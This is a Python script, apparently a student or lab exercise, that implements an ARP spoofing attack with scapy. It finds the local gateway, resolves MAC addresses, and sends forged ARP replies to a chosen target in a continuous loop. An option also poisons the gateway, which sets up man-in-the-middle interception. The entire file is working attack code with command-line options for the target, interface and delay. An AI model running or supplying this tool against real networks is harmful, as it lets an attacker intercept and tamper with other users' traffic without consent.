import argparse
import sys
from scapy.all import *
from uuid import getnode

def find_my_IP_and_MAC():
    """ I send echo pck when the ttl is 0 so when it arrive to the GW he send me back a TTL ERROR (ICMP MESSEGE)
    , the dst is our ip.
    """
    mac = ':'.join(re.findall('..', '%012x' % getnode()))
    # I write IP and not domain cause i want to save time.
    p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX",verbose=0,timeout=5) #verbose = withuot output
    return mac,p.dst

def get_GW():
    """send echo pck when the ttl is 0 so when it arrive to the GW he send me back a TTL ERROR (ICMP MESSEGE)
    , the src is the GW"""
    p = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX",verbose=0)
    return p.src

def find_mac_by_ip(ip):
    result = sr1(ARP(op=ARP.who_has, pdst=ip),verbose=0)
    return result.hwsrc #The mac

def create_arp_response_packet(ipSrc,macSrc,ipDst,macDst):
    return ARP(op=ARP.is_at, psrc=ipSrc, hwsrc=macSrc, hwdst=macDst, pdst=ipDst)


myMac, myIp =find_my_IP_and_MAC()
ipGW=get_GW()


parser = argparse.ArgumentParser(description='Process some arguments.')
parser.add_argument("-i" ,"--iface", type=str, default='enp0s3',
                    help="The attack interface")
parser.add_argument("-s" ,"--src", type=str, default=myIp,
                    help="The address you want for the attacker")
parser.add_argument("-d" ,"--delay", type=float, default=1,
                    help="Delay (in seconds) between messages")
parser.add_argument("-gw" ,"--gateway", action='count', default=0,
                    help="should GW be attacked as well")
#seperate between to types of argument: optional and required
required = parser.add_argument_group('required arguments')
required.add_argument("-t" ,"--target", type=str,
                    help="The attacked ip", required=True)


args = parser.parse_args()

def main():
    macVic=find_mac_by_ip(args.target)
    macSrc,ipSrc=find_my_IP_and_MAC()
    # check if the user enter src
    if ipSrc != args.src:
        ipSrc=args.src
        macSrc=find_mac_by_ip(ipSrc)
        print 'src change'
    #if the user -gw
    if args.gateway>0:
        macGW=find_mac_by_ip(ipGW)
        pck=[create_arp_response_packet(args.target,macSrc,ipGW,macGW)] #create a list with one packet
        pck.append(create_arp_response_packet(ipGW,macSrc,args.target,macVic))
    else:
        pck=create_arp_response_packet(ipGW,myMac,args.target,macVic)

    send(pck,inter=args.delay,loop=1)


if __name__=="__main__":
    main()